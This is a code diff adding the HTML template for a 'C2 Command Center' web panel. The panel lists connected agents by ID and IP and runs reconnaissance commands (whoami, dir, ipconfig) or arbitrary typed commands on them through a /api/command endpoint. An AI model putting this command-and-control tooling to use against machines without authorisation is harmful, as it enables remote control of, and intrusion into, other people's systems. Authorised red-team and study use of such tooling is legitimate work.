@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>C2 Server</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <h1>C2 Command Center</h1>
+    
+    <h2>Connected Agents</h2>
+    <table border="1">
+        <tr>
+            <th>ID</th>
+            <th>IP Address</th>
+            <th>Action</th>
+        </tr>
+        {{range .Agents}}
+        <tr>
+            <td>{{.ID}}</td>
+            <td>{{.IP}}</td>
+            <td>
+                <button onclick="sendCommand({{.ID}}, 'whoami')">whoami</button>
+                <button onclick="sendCommand({{.ID}}, 'dir')">dir</button>
+                <button onclick="sendCommand({{.ID}}, 'ipconfig')">ipconfig</button>
+            </td>
+        </tr>
+        {{end}}
+    </table>
+
+    <h2>Manual Command</h2>
+    <input type="number" id="agentId" placeholder="Agent ID">
+    <input type="text" id="commandInput" placeholder="Enter command">
+    <button onclick="sendCustomCommand()">Execute</button>
+
+    <h3>Output:</h3>
+    <pre id="outputBox">Waiting for commands...</pre>
+
+    <script>
+        function sendCommand(id, cmd) {
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id: id, cmd: cmd })
+            })
+            .then(response => {
+                // 1. Check if the response is OK (status 200-299)
+                if (!response.ok) {
+                    // If error, read the plain text error message
+                    return response.text().then(text => {
+                        throw new Error(text || 'Unknown error');
+                    });
+                }
+                // 2. If OK, parse as JSON
+                return response.json();
+            })
+            .then(data => {
+                // Success: display output
+                document.getElementById('outputBox').textContent = data.output;
+            })
+            .catch(err => {
+                // Display the error message nicely
+                document.getElementById('outputBox').textContent = '❌ Error: ' + err.message;
+            });
+        }
+    
+        function sendCustomCommand() {
+            const id = document.getElementById('agentId').value;
+            const cmd = document.getElementById('commandInput').value;
+            if (id && cmd) sendCommand(parseInt(id), cmd);
+        }
+    </script>
+</body>
+</html>
